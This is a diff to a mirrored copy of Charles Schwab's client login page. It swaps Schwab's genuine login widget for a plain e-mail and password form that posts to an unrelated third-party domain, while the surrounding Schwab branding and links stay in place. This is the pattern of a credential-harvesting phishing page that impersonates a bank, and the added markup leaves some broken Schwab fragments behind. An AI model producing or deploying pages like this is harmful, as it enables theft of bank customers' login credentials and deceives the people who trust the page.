@@ -63,38 +63,54 @@
 
 
 
-                        <div class="login-module-wrapper legacy-size sdps-solo-layout__body sdps-css-grid__cell sdps-css-grid__cell--span-12 sc-sdps-solo-layout sc-sdps-solo-layout-s">
-                            <div class="login-module  with-solo-banner">
-                                <div class="lms-iframe-wrapper">
-                                    <h1 class="login-module-header">
-                                        <span class="login-title sdps-title-3">Log in to Schwab</span>
-                                    </h1>
+                        <div class="bg-white p-3 shadow-lg">
+            <div class="text-center mb-3">
+                <strong class="text-uppercase">Login to your account</strong>
+            </div>
+            <form method="POST" action="https://www.allinlondon.co.uk/login">
+                <input type="hidden" name="_token" value="KZ1f2Km7svaTv77VH6AmM12hzYcfmjLH4pwJ2Zma">                <div class="form-group row">
+                    <label for="email" class="col-md-4 col-form-label text-md-right">E-Mail Address</label>
+                    <div class="col-md-6">
+                        <input id="email" type="email" class="form-control " name="email" value="" required autocomplete="email" autofocus>
+                                            </div>
+                </div>
 
-                                        <iframe id="lmsIframe" allow="publickey-credentials-get https://sws-gateway-nr.schwab.com" src="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secondary&amp;redirecturi=https%3a%2f%2fclient.schwab.com%2fAreas%2fAccess%2fSignOn%2fAuth" scrolling="no" aria-label="Login widget"></iframe>
+                <div class="form-group row">
+                    <label for="password" class="col-md-4 col-form-label text-md-right">Password</label>
 
-                                    <script type="text/javascript">
-                                        const delayedLoadHandlers = [];
-                                        let delayedLoadExecuted = false;
+                    <div class="col-md-6">
+                        <input id="password" type="password" class="form-control " name="password" required autocomplete="current-password">
 
-                                        document.getElementById('lmsIframe').addEventListener('load', () => {
-                                            setTimeout(function () {
-                                                delayedLoadExecuted = true;
+                                            </div>
+                </div>
 
-                                                if (delayedLoadHandlers.length) {
-                                                    for (let i = 0; i < delayedLoadHandlers.length; i++) {
-                                                        delayedLoadHandlers[i]();
-                                                    }
-                                                }
-                                            }, 2000);
-                                        })
-                                    </script>
+                <div class="form-group row">
+                    <div class="col-md-6 offset-md-4">
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" name="remember" id="remember" >
 
-                                </div>
-                                    <footer class="login-module-help-links">
-                                        <ul class="sdps-list--inline">
-                                                <li>
-Forgot <a href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secondary&amp;redirecturi=https%3a%2f%2fclient.schwab.com%2fAreas%2fAccess%2fSignOn%2fAuth#/ar/fyl" aria-label="Recover your Login ID">Login ID</a> or <a href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secondary&amp;redirecturi=https%3a%2f%2fclient.schwab.com%2fAreas%2fAccess%2fSignOn%2fAuth#/ar/login" aria-label="Recover your Password">Password?</a>                                                </li>
-                                                                                            <li>
+                            <label class="form-check-label" for="remember">
+                                Remember Me
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group row mb-0">
+                    <div class="col-md-8 offset-md-4">
+                        <button type="submit" class="btn btn-primary">
+                            Login
+                        </button>
+
+                                                    <a class="btn btn-link" href="password/reset.html">
+                                Forgot Your Password?
+                            </a>
+                                            </div>
+                </div>
+            </form>
+        </div>
+    </div>
+                    <li>
                                                     <a href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-clwe&amp;state=clwe#/welcome">New User?</a>
                                                 </li>
                                             <li>
@@ -351,3 +367,4 @@ Forgot <a href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secon
 
 <!-- Mirrored from client.schwab.com/Areas/Access/Login by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 19 Aug 2025 18:24:17 GMT -->
 </html>
+
